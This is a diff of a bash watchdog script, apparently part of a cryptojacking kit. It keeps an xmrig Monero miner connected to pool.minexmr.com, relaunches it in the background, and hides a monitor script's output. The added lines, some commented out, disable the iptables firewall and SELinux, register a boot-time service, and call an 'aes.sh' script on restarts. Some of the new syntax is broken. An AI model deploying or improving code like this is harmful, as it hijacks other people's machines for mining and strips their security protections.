@@ -1,4 +1,8 @@
 #!/bin/bash
+# chkconfig --add networkstart 
+# chkconfig networkstart on
+# service stop iptables   
+# setenforce 0
 function CheckProcess()
 {
 # Check whether the parameter is present
@@ -15,17 +19,18 @@ function CheckProcess()
         fi
 }
 
-./monitor2.sh >/dev/null 2>&1 &  
+./monitor.sh >/dev/null 2>&1 &  
+num=0
 while [ 1 ] ; do
-        CheckProcess "./xmrig -o pool.minexmr.com:443"
-        if [ $? == 0 ];then
-    # restart xxx
-    nohup ./run.sh & start
-    fi
-
+    CheckProcess "./xmrig -o pool.minexmr.com:443"
+    if [ $? == 0 ];then
+        # restart & aes 
+        if[$num!=0]; then ./aes.sh fi
+        nohup ./run.sh & start
+        num=$num+1    
     #add other process...
-
-sleep 5
+    fi
+sleep 20
 done &
 
 
